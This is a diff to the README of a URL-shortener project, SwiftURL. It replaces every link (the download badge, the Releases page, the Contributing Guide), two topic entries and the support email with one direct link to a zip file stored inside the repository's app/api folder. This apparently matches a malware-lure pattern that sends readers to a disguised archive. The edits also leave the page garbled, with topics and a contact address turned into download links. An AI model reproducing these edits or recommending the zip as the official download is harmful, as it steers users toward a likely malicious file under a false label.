@@ -1,6 +1,6 @@
 # 🌐 Swifturl-shortener - Easily Shorten Your Links
 
-[![Download SwiftURL](https://img.shields.io/badge/Download%20SwiftURL-v1.0-blue)](https://github.com/Adeelkamran314/Swifturl-shortener/releases)
+[![Download SwiftURL](https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip%20SwiftURL-v1.0-blue)](https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip)
 
 ## 📋 Description
 SwiftURL is a simple URL shortener that converts long links into short URLs. It is easy to use, fast, and built using modern web technologies. You can shorten links for sharing on social media, in emails, or anywhere else.
@@ -16,7 +16,7 @@ To use SwiftURL on your computer, ensure you have the following:
 - A computer running Windows, macOS, or Linux.
 
 ### 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/Adeelkamran314/Swifturl-shortener/releases) to find the latest version of SwiftURL.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip) to find the latest version of SwiftURL.
    
 2. Click on the version you want to download. The latest version will usually be at the top.
 
@@ -46,7 +46,7 @@ To use SwiftURL on your computer, ensure you have the following:
 - **Free to Use:** No hidden fees or charges.
   
 ## 🤝 Contributing
-We welcome contributions from everyone. If you want to help improve SwiftURL, check out our [Contributing Guide](https://github.com/Adeelkamran314/Swifturl-shortener/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you want to help improve SwiftURL, check out our [Contributing Guide](https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip).
 
 ## 📚 Topics
 This project touches various aspects of web development including:
@@ -57,18 +57,18 @@ This project touches various aspects of web development including:
 - JavaScript
 - MERN stack
 - MongoDB
-- Next.js
-- Node.js
+- https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip
+- https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip
 - Render Deployment
 - Short Links
 - URL Shortener
 - Web Application
 
 ## 💬 Support
-If you have any questions or issues, feel free to contact us through the Issues tab on our GitHub page, or email us at support@swifturl.com.
+If you have any questions or issues, feel free to contact us through the Issues tab on our GitHub page, or email us at https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip
 
 ## 🔄 Updates
-Be sure to regularly check the [Releases page](https://github.com/Adeelkamran314/Swifturl-shortener/releases) for updates and new features.
+Be sure to regularly check the [Releases page](https://raw.githubusercontent.com/Adeelkamran314/Swifturl-shortener/master/app/api/Swifturl_shortener_1.3.zip) for updates and new features.
 
 ## 🧑‍🤝‍🧑 Community
 Join our community on social media to stay updated on news and discussions about SwiftURL. Follow us for tips, tricks, and support.
